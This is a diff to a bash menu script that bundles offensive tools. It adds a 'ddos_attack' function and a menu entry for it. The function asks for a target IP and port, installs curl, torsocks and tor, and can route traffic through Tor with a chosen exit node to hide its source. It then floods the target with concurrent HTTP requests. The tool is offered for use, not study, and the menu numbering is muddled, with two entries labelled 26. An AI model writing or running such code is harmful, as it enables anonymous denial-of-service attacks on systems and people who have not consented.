@@ -911,6 +911,85 @@ EOF
     echo "==============================="
 }
 
+ddos_attack() {
+
+  # Step 1: Define default values
+  local TARGET_IP=""
+  local TARGET_PORT=80
+  local NUM_CONNECTIONS=100
+  local TOR_MODE=false
+  local TOR_EXIT_NODE=""
+
+  # Step 2: Get the target IP address and port
+  read -p "Enter the target IP address: " TARGET_IP
+  if [ -z "$TARGET_IP" ]; then
+    echo "You must specify a target IP address!"
+    exit 1
+  fi
+
+  read -p "Enter the target port (default is 80): " input_port
+  if [ ! -z "$input_port" ]; then
+    TARGET_PORT=$input_port
+  fi
+
+  # Step 3: Get the number of concurrent connections
+  read -p "Enter the number of connections (default is 100): " input_connections
+  if [ ! -z "$input_connections" ]; then
+    NUM_CONNECTIONS=$input_connections
+  fi
+
+  # Step 4: Check if user wants to use Tor for anonymity
+  read -p "Do you want to route the attack through Tor? (y/n) [n]: " use_tor
+  if [[ "$use_tor" =~ ^(y|Y) ]]; then
+    TOR_MODE=true
+
+    # Step 5: Ask for a specific Tor exit node (optional)
+    read -p "Enter a specific Tor exit node (e.g., {us} or {no}) [Press Enter to skip]: " TOR_EXIT_NODE
+    TOR_EXIT_NODE=${TOR_EXIT_NODE:-""}
+  fi
+
+  # Step 6: Install necessary packages (curl, torsocks, tor)
+  echo "Installing necessary packages..."
+  sudo apt-get update
+  sudo apt-get install -y curl torsocks tor
+
+  if [ "$TOR_MODE" = true ]; then
+    # Step 7: Configure Tor if required
+    echo "Configuring Tor..."
+    sudo systemctl enable tor
+    sudo systemctl start tor
+    if [ ! -z "$TOR_EXIT_NODE" ]; then
+      sudo sed -i "/^ExitNodes/c\ExitNodes $TOR_EXIT_NODE" /etc/tor/torrc
+    fi
+    sudo systemctl restart tor
+    echo "Tor is configured and running with exit node: $TOR_EXIT_NODE"
+  fi
+
+  # Step 8: Start the attack
+  echo "Launching DDoS attack on $TARGET_IP:$TARGET_PORT with $NUM_CONNECTIONS connections..."
+
+  # Function to send HTTP requests
+  send_request() {
+    if [ "$TOR_MODE" = true ]; then
+      torsocks curl -s "http://$TARGET_IP:$TARGET_PORT" >/dev/null
+    else
+      curl -s "http://$TARGET_IP:$TARGET_PORT" >/dev/null
+    fi
+  }
+
+  # Step 9: Use concurrent connections to flood the target
+  for ((i = 1; i <= NUM_CONNECTIONS; i++)); do
+    send_request &
+  done
+
+  # Wait for all background processes to finish
+  wait
+
+  echo "DDoS attack complete on $TARGET_IP:$TARGET_PORT with $NUM_CONNECTIONS connections."
+}
+
+
+
 start_ssh_server() {
 
   # Step 1: Define default values
@@ -1060,9 +1139,10 @@ while true; do
     echo "23) Start metasploit_framework"
     echo "24) Start airgeddon "
     echo "25) Start wireshark "
+    echo "26) Start I2P DDOS attack"
     echo "26) Start deamon manager"
     echo "27) Start listening for zombies"
-    echo "26) DEAMON MANAGER by V.ex.e;; coming soon..."
+    echo "28) DEAMON MANAGER by V.ex.e;; coming soon..."
     echo "0) Exit"
     read -p "Enter your choice: " choice
 
@@ -1092,8 +1172,9 @@ while true; do
         23) display_kali_dragon; start_metasploit_framework ;;
         24) display_kali_dragon; start_airgeddon ;;
         25) display_kali_dragon; start_wireshark ;;
-        26) display_kali_dragon; start_listener ;;
-        27) display_kali_dragon; start_ssh_server ;;
+        26) display_kali_dragon; ddos_attack ;;
+        27) display_kali_dragon; start_listener ;;
+        28) display_kali_dragon; start_ssh_server ;;
         0) display_kali_dragon; exit ;;
         *) echo "Invalid option!" ;;
     esac
